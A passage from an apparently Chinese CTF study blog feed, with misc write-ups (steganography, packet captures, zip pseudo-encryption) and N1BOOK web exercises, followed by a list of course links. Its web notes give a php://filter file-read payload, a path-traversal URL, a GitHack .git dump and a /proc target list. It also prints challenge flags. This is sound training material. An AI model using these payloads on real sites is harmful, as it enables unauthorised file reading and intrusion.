flag.vmdk -o./tree</code></pre><p>flag{N7F5_AD5_i5_funny!}</p><h1 id="2021-1-23"><a href="#2021-1-23" class="headerlink" title="2021/1/23"></a>2021/1/23</h1><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>hint：朋友的网站被黑客上传了webshell后门，他把网站打包备份了，你能帮忙找到黑客的webshell在哪吗？(Webshell中的密码(md5)即为答案)。</p><p>D盾一把梭</p><p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>hint：某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p><p>得到的文件用wireshark打开过滤只看HTTP</p><p>看到login数据包，查看分组字节流发现：name=admina&amp;word=adminb</p><p>adminaadminb搜索在线md5hash或者本地工具hash</p><p>flag{1d240aafe21a86afc11f38a45b541a49}</p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>知识点：F5隐写</p><p>kali中安装F5-steganography 工具</p><pre><code>git clone https://github.com/matthewgao/F5-steganography</code></pre><p>解密的时候输入：</p><pre><code>java Extract /图片的绝对路径 [-p 密码] [-e 输出文件]</code></pre><p>此处要粘贴文件名，然后得到文件output.txt，打开文本发现有pk字样，基本就可以确定是zip，所有不需要hxd打开，得到flag：flag{96efd0a2037d06f34199e921079778ee}</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>改为zip文件得到key，cipher（密码）文件</p><p>key.txt打开得到：V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</p><p>base64解码后得到：What is Nicki Minaj’s favorite song that refers to snakes?（妮琪·米娜最喜欢的一首提到蛇的歌是什么？）百度得到巨蟒：anaconda（这个mv十分的带劲！！！！）</p><p><del>看完wp得知：</del>联想到以蛇命名的加密算法Serpent。以anaconda为密钥，用<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">在线工具</a>对cipher进行解密。</p><p>选择针对文件的解密，key就是anaconda，最后得到flag：</p><p>CTF{who_knew_serpent_cipher_existed}</p><h1 id="2021-1-24"><a href="#2021-1-24" class="headerlink" title="2021/1/24"></a>2021/1/24</h1><p>ctfshow大吉大利杯</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h2><p>题目：开局一张图，flag全靠<strong>猜</strong></p><p>因为出题人失误搞错了，解出来的key去掉后3位的com</p><p>右键属性，详细信息：新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</p><p>解得：gemlove</p><p>再根据题目中加粗的<strong>猜</strong>字，尝试使用outguess。</p><pre><code>git clone https://github.com/crorvick/outguess.gitcd outguess./configure &amp;&amp; make &amp;&amp; make installoutguess -k gemlove -r &#39;/root/outguess/CTF/sheng_huo_zhao_zhao.jpg&#39; flag.txtlscat flag.txtBJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></pre><p>按照wp来就行</p><h2 id="梅花香之苦寒来（水文）"><a href="#梅花香之苦寒来（水文）" class="headerlink" title="梅花香之苦寒来（水文）"></a>梅花香之苦寒来（水文）</h2><p>两种解法都失败，这里只记录一种简单的做法：</p><p>hxd打开看见ÿÙ（ff d9）是16进制开头的数字，转码ascⅡ得到神秘小坐标</p><p>gnuplot使用步骤</p><p>1.终端输入gnuplot</p><p>2.进入后输入plot ，文件直接拖进去</p><p>3.可以直接看到图了</p><p>文件格式只需要留下逗号</p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>得到文件后缀：pcapng，wireshark打开</p><p>待解。</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><h2 id="少了一半？？-题目来自starsnow"><a href="#少了一半？？-题目来自starsnow" class="headerlink" title="少了一半？？(题目来自starsnow)"></a>少了一半？？(题目来自starsnow)</h2><p>得到的是jpg文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A51537_1.png" alt></p><p>这里将黑色标记的41改为EE得到flag</p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>学习php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP 语法</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP 变量</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP 数据类型</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP 类型比较</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP 常量</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP 字符串</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP 运算符</a></p><h1 id="2021-01-28"><a href="#2021-01-28" class="headerlink" title="2021-01-28"></a>2021-01-28</h1><p><a href="https://www.runoob.com/php/php-if-else.html" target="_blank" rel="noopener">PHP If…Else</a></p><p><a href="https://www.runoob.com/php/php-switch.html" target="_blank" rel="noopener">PHP Switch</a></p><p><a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">PHP 数组</a></p><p><a href="https://www.runoob.com/php/php-arrays-sort.html" target="_blank" rel="noopener">PHP 数组排序</a></p><p><a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP 超级全局变量</a></p><p><a href="https://www.runoob.com/php/php-looping.html" target="_blank" rel="noopener">PHP While 循环</a></p><p><a href="https://www.runoob.com/php/php-looping-for.html" target="_blank" rel="noopener">PHP For 循环</a></p><p><a href="https://www.runoob.com/php/php-functions.html" target="_blank" rel="noopener">PHP 函数</a></p><h1 id="2021-01-29"><a href="#2021-01-29" class="headerlink" title="2021-01-29"></a>2021-01-29</h1><p>黑马教程-p53</p><h1 id="2021-01-30"><a href="#2021-01-30" class="headerlink" title="2021-01-30"></a>2021-01-30</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>黑马教程p54+16=p70</p><h1 id="2021-01-31"><a href="#2021-01-31" class="headerlink" title="2021-01-31"></a>2021-01-31</h1><h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><p>黑马教程p70+16=p86</p><h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>得到我文件用wireshark打开，过滤出ftp文件传输协议，右键追踪流点击tcp发现了flag.rar，用foremost跑一下，得到rar压缩包，四位数爆破得到密码5790，打开得到flag</p><p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p><h2 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><p>得到文件10.xls，打开以后我得到是乱码，但是在文件头看见pk字节是zip压缩包的标准，于是用foremost打开跑一下，得到压缩包，打开即可找到flag.txt</p><h2 id="被偷走的文件-1"><a href="#被偷走的文件-1" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>得到我文件用wireshark打开，过滤出ftp文件传输协议，右键追踪流点击tcp发现了flag.rar，用foremost跑一下，得到rar压缩包，四位数爆破得到密码5790，打开得到flag</p><p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p><h2 id="BJDCTF2020-认真你就输了-1"><a href="#BJDCTF2020-认真你就输了-1" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><p>得到文件10.xls，打开以后我得到是乱码，但是在文件头看见pk字节是zip压缩包的标准，于是用foremost打开跑一下，得到压缩包，打开即可找到flag.txt</p><h1 id="2021-02-01"><a href="#2021-02-01" class="headerlink" title="2021-02-01"></a>2021-02-01</h1><p>黑马教程p86-p96</p><h1 id="2021-02-02"><a href="#2021-02-02" class="headerlink" title="2021-02-02"></a>2021-02-02</h1><h2 id="BJDCTF2020-藏藏藏"><a href="#BJDCTF2020-藏藏藏" class="headerlink" title="[BJDCTF2020]藏藏藏"></a>[BJDCTF2020]藏藏藏</h2><p>得到jpg，将后缀改为zip，得到一个二维码，用qr research扫描一下得到flag{you are the best!}</p><h2 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h2><p>得到压缩包，显示一部伪加密，从504B0102开始计算，第九第十个字符为加密字段，将其设置为0000即可变成无加密状态。50下面数5，6行的位置，14000900，将9改为0，破解伪加密，得到佛文，旧佛曰解密（带上佛曰二字）得：flag{w0_fo_ci_Be1}</p><p>补充：.RAR文件由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p><h1 id="2021-02-03-立春"><a href="#2021-02-03-立春" class="headerlink" title="2021-02-03(立春)"></a>2021-02-03(立春)</h1><h2 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h2><p>引子：深夜里，Hack偷偷的潜入了某公司的内网，趁着深夜偷走了公司的秘密文件，公司的网络管理员通过通过监控工具成功的截取Hack入侵时数据流量，但是却无法分析出Hack到底偷走了什么机密文件，你能帮帮管理员分析出Hack到底偷走了什么机密文件吗？</p><p>wireshark打开追踪ftp文件传输协议的流的得到小偷盗走的是：6b0341642a8ddcbeb7eca927dae6d541.rar压缩包</p><p>所以尝试使用foremost分离一下得到一个压缩包爆破得到密码1903，里面有个文件就是 6b0341642a8ddcbeb7eca927dae6d541.txt，所以上面咱分析的没错，但是根据题目要求，分离一步多此一举</p><h2 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h2><p>得到压缩包，直接压缩包损坏，我直接觉得是伪加密，打开一看一点zip的样子都没有，是png，直接得到一张二维码qr一扫，跟我说flag不在这，那么foremost再一跑，没东西。stesolve也没东西，让我想起来了用winhex发现的flag，十分不像因为这样的话就太。。简单了，但是就是他。。。。</p><p>flag{i_am_fl@g}</p><h2 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h2><p>188kb做为一张简单的二维码，你太大了，改为zip文件得到文本encode，内容是base64，解码得到：asdfghjkl1234567890，这应该不是flag，binwalk -e 123.rar</p><p>从其中一个文件得到一大串base加密的，python实现自动解码base64得到：comEON_YOuAreSOSoS0great</p><p>得到mp3文件，是莫斯电码：morseisveryveryeasy←转码得到，flag{morseisveryveryeasy}</p><h1 id="2021-02-04-小年"><a href="#2021-02-04-小年" class="headerlink" title="2021-02-04(小年)"></a>2021-02-04(小年)</h1><h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p>注意力注意了，新思路！！</p><p>函数：</p><p>php hex2bin()函数：把十六进制值转换为 ASCII 字符</p><p>功能：交错，将一张图片盖到另一张图片上，可以使用反交错功能进行解决</p><p>1.file 1.jpg可以查看文件的类型，可以将文件类型改为avi变成一个小视频，其在winhex中的开头前缀为：riff</p><p>2.采用软件进行分帧和反交错处理：Kinovea</p><p>3.得到的二维码不清晰，采用降低亮度，提高对比度</p><p>4.将扫码得到的内容进行16进制转ascii码得：</p><p>125帧扫码得到：6167696E5F6C，转码为agin_l；129帧扫码得到：6F76655F59，转码为ove_Y；133帧扫码得到：424A447B696D，转码为BJD{im；136帧扫码得到：316E677D，转码为1ng}。拼接得到BJD{imagin_love_Y1ng}，即为flag。</p><h2 id="山司小年红包题目"><a href="#山司小年红包题目" class="headerlink" title="山司小年红包题目"></a>山司小年红包题目</h2><p>1.得到二维码，扫码得到Sir Your Plane Will Arrive At (2p. m. )</p><p>2.foremost分离得到zip，密码采用爆破自定义的字符串：sypwaa1400得到密码</p><p>3.得到01二进制，题目名字为qr_code所以联想到二进制转二维码通过脚本（使用前要pip install pillow，否则无法运行pil版块）：</p><pre><code>from PIL import ImageMAX = 21width = 25height = 25pic = Image.new(&quot;RGB&quot;,(width, height))str = &quot;&quot;#输入二进制i=0for y in range (0,height):    for x in range (0,width):        if(str[i] == &#39;1&#39;):            pic.putpixel([x,y],(0, 0, 0))        else:            pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p>得到图片以后通过在线ps得到完整的二维码，扫码得到flag</p><h1 id="2021-02-05"><a href="#2021-02-05" class="headerlink" title="2021-02-05"></a>2021-02-05</h1><h2 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h2><p>都说是一叶障目考虑到图片高度被修改，采用脚本计算模板(注意需要安装cypto模板，但是需要安装p开头的)：</p><pre><code>import structimport binasciifrom Crypto.Util.number import bytes_to_longimg = open(&#39;C:/Users/Administrator/Desktop/1.png&#39;, &#39;rb&#39;).read()for i in range(0xFFFF):    stream = img[12:20] + struct.pack(&#39;&gt;i&#39;, i) + img[24:29]    crc = binascii.crc32(stream)    if crc == bytes_to_long(img[29:33]):        print(i, hex(i))</code></pre><p>得到高度为844而其16进制为34c所以给为034c即可</p><p>得到修改的图片为xaflag{66666}</p><h2 id="傅里叶光学实验-山司平台"><a href="#傅里叶光学实验-山司平台" class="headerlink" title="傅里叶光学实验(山司平台)"></a>傅里叶光学实验(山司平台)</h2><p>利用脚本放在同一个目录直接跑就行</p><pre><code>import numpy as npimport cv2 as cvfrom matplotlib import pyplot as pltimg = cv.imread(&#39;1.bmp&#39;, 0)f = np.fft.fft2(img)logf = 20*np.log(np.abs(f))plt.imshow(logf, &#39;gray&#39;)plt.show()</code></pre><p>坑：需要安装模板matplotlib（这个需要注意，其余的没坑）<a href="https://blog.csdn.net/zzx2016zzx/article/details/83099583" target="_blank" rel="noopener">https://blog.csdn.net/zzx2016zzx/article/details/83099583</a></p><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>会有client.pcap和serve.key文件，打开wireshark点击编辑</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8805%E6%97%A52318_1.png" alt></p><p>ok我已经很详细的做出一张图，最后解密完，搜索http即可找到flag</p><h1 id="2021-02-08"><a href="#2021-02-08" class="headerlink" title="2021-02-08"></a>2021-02-08</h1><h2 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h2><p>嫦娥当年奔月后，非常后悔，因为月宫太冷清，她想：早知道让后羿自己上来了，带了只兔子真是不理智。于是她就写了一首曲子，诉说的是怀念后羿在的日子。无数年后，小明听到了这首曲子，毅然决定冒充后羿。然而小明从曲子中听不出啥来，咋办。。</p><p>得到音乐mp3，带有摩斯密码，用audacity打开分离音乐，解得：f029bd6f551139eedeb8e45a175b0786</p><p>flag{f029bd6f551139eedeb8e45a175b0786}</p><h2 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h2><p>得到两张gif，但是第二张无法显示winhex打开，gif89a的gif文件头被篡改16进制为47494638,flag{zhi_yin_you_are_beautiful}</p><h1 id="转战ctfshow"><a href="#转战ctfshow" class="headerlink" title="转战ctfshow"></a>转战ctfshow</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1BOOK</title>
      <link href="/2021/01/15/n1book/"/>
      <url>/2021/01/15/n1book/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p><p>Git测试</p><p>Hello, CTFer!</p><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><hr><p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><p>看网上说这是git测试，听别人看书说要用一个工具叫：scrabble，但是我没有书，所以我就不和他用一样的工具：Githack</p><p>kali没有自己下载：</p><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.git</code></pre><p>然后就发现<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50926_2.png" alt></p><p>打开以后</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50927_3.png" alt></p><p>n1book{git_looks_s0_easyfun}</p><p>完事了</p><p>关于书上记载的关于githack的命令：</p><p>git log -all或git branch -v（看到master分支信息）</p><p>git reflog（看到一些checkout记录）</p><h2 id="常见的搜集"><a href="#常见的搜集" class="headerlink" title="常见的搜集"></a>常见的搜集</h2><h4 id="知识经验总结："><a href="#知识经验总结：" class="headerlink" title="知识经验总结："></a>知识经验总结：</h4><p><strong>常规文件</strong>：</p><ul><li>robots.txt记录一些目录和CMS版本信息</li><li>readme.md：记录CMS版本信息，有的甚至有github地址</li><li><a href="http://www.zip/rar/tar.gz：往往是网站的源码备份" target="_blank" rel="noopener">www.zip/rar/tar.gz：往往是网站的源码备份</a></li></ul><p><strong>vim备份文件</strong>：</p><p>第一次意外退出的备份文件为.flag.swp</p><p>第二次.flag.swo</p><p>第三次.flag.swn以此类推</p><p>实际环境环境中，网站的备份往往可能是网站域名的压缩包</p><p><strong>gedit备份文件</strong>：</p><p>gedit编辑器保存后，当前目录会生成一个后缀<del>的文件就比如flag</del></p><p>关于此题：</p><p>先访问/robots.txt文件得到：/flag1_is_her3_fun.txt访问得到：flag1:n1book{info_1</p><p>再试试<a href="http://www.zip发现没有什么结果" target="_blank" rel="noopener">www.zip发现没有什么结果</a></p><p>再试试index.php~</p><p>得flag2:s_v3ry_im</p><p>准备下载.index.php.swp</p><p>将后缀改为txt文件打开发现：</p><p>flag3:p0rtant_hack}</p><p>拼凑在一起齐了：n1book{info_1s_v3ry_imp0rtant_hack}</p><h2 id="afr-1"><a href="#afr-1" class="headerlink" title="afr_1"></a>afr_1</h2><p>任意文件读取漏洞</p><p>考点：php://filter/convert.base64-encode/resource=flag</p><p>得到：</p><pre><code>PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9</code></pre><p>解码得到：</p><pre><code>&lt;?phpdie(&#39;no no no&#39;);//n1book{afr_1_solved}</code></pre><h2 id="afr-2"><a href="#afr-2" class="headerlink" title="afr_2"></a>afr_2</h2><p>打开一看，发现精神小伙，f12发现来自img</p><p><a href="http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img/" target="_blank" rel="noopener">http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img/</a></p><p><a href="http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img../" target="_blank" rel="noopener">http://c363f79a-f65a-401d-a4bf-f29f0a8b3c90.node3.buuoj.cn/img../</a></p><p>打开目录下面的flag下载得</p><p>n1book{afr_2_solved}</p><h2 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h2><p>这个题考查的是/proc目录：</p><p>（14）/proc目录</p><p> /proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。</p><p>对应目录下的cmdline可读出比较敏感的信息，</p><p>Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。<br>/proc/[pid],当查看当前进程的时候可以用/proc/self代替<br>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息<br>cwd — 指向当前进程运行目录的一个符号链接<br>environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示</p><pre><code>/proc/sched_debug # 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用/proc/mounts # 挂载的文件系统列表/proc/net/arp # arp表，可以获得内网其他机器的地址/proc/net/route # 路由表信息/proc/net/tcp and /proc/net/udp # 活动连接的信息/proc/net/fib_trie # 路由缓存/proc/version  # 内核版本/proc/[PID]/cmdline # 可能包含有用的路径信息/proc/[PID]/environ #  程序运行的环境变量信息，可以用来包含getshell/proc/[PID]/cwd     # 当前进程的工作目录/proc/[PID]/fd/[#] # 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</code></pre><p>信息收集阶段：</p><p>点点点后，发现先URL变为：<a href="http://5461f9a1-2430-445b-ac0b-9766e62171bd.node3.buuoj.cn/article?name=article" target="_blank" rel="noopener">http://5461f9a1-2430-445b-ac0b-9766e62171bd.node3.buuoj.cn/article?name=article</a></p><p>这里可以传入参数，根据书上资料利用/proc/self/cmdline来显示当前进程</p><p>得到：pythonserver.py</p><p>也就是说，当前有py程序在运行，或者说，整个题目靠的是这个程序运作，查看源代码/proc/self/cwd/server.py</p><p>蹦出来一堆，看半天没看明白，因为后面考查的是flask模板注入</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> 从0到1ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千锋资源</title>
      <link href="/2021/01/14/qian-feng-zi-yuan/"/>
      <url>/2021/01/14/qian-feng-zi-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="千峰在线学习地址："><a href="#千峰在线学习地址：" class="headerlink" title="千峰在线学习地址："></a><strong>千峰在线学习地址：</strong></h3><p><strong>在线观看地址：</strong><a href="http://www.mobiletrain.org/testing/video-list3.shtml" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list3.shtml</a><br><strong>官方B站地址：</strong><a href="https://space.bilibili.com/146668655" target="_blank" rel="noopener">https://space.bilibili.com/146668655</a><br><strong>官方知乎地址：</strong><a href="https://www.zhihu.com/org/qian-feng-jiao-yu-39" target="_blank" rel="noopener">https://www.zhihu.com/org/qian-feng-jiao-yu-39</a></p><h3 id="各学科学习资源："><a href="#各学科学习资源：" class="headerlink" title="各学科学习资源："></a><strong>各学科学习资源：</strong></h3><p><strong>Java：</strong><a href="http://www.mobiletrain.org/testing/video-list-java.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-java.shtml?ssss</a></p><p><strong>HTML5/web前端：</strong><a href="http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss</a></p><p><strong>Python：</strong><a href="http://www.mobiletrain.org/testing/video-list-python.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-python.shtml?ssss</a></p><p><strong>UI设计：</strong><a href="http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss</a></p><p><strong>Linux/云计算：</strong><a href="http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss</a></p><p><strong>软件测试：</strong><a href="http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss</a></p><p><strong>大数据：</strong><a href="http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss</a></p><p><strong>物联网：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss</a></p><p><strong>网络安全：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss</a></p><p><strong>互联网营销：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss</a></p><p><strong>go语言：</strong><a href="http://www.mobiletrain.org/testing/video-list-go.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-go.shtml?ssss</a></p><p><strong>Unity/游戏开发：</strong><a href="http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss</a></p><p><strong>PHP：</strong><a href="http://www.mobiletrain.org/testing/video-list-php.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-php.shtml?ssss</a></p><h3 id="计算机等级考试资源："><a href="#计算机等级考试资源：" class="headerlink" title="计算机等级考试资源："></a><strong>计算机等级考试资源：</strong></h3><p><strong>2020版_全国计算机等级考试二级Java程序设计</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1sT4y1F7Ka" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1sT4y1F7Ka</a><br>网盘链接：<a href="https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ</a> 提取码: 2igi<br><strong>2020版_全国计算机Python二级真题讲解</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1qy4y1B7wN" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1qy4y1B7wN</a><br>网盘链接：<a href="https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ</a> 提取码: fk9x<br><strong>2020版_全国计算机Web二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1GV411y7VT" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1GV411y7VT</a><br>网盘链接：<a href="https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg</a> 提取码: fjxb<br><strong>2020年计算机全国等级考试二级C语言教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ht4y1i7tx" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ht4y1i7tx</a><br>网盘链接：<a href="https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA" target="_blank" rel="noopener">https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA</a> 提取码: 5v8p<br><strong>2020版_全国计算机MySQL二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ni4y137A7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ni4y137A7</a><br>网盘链接：<a href="https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg" target="_blank" 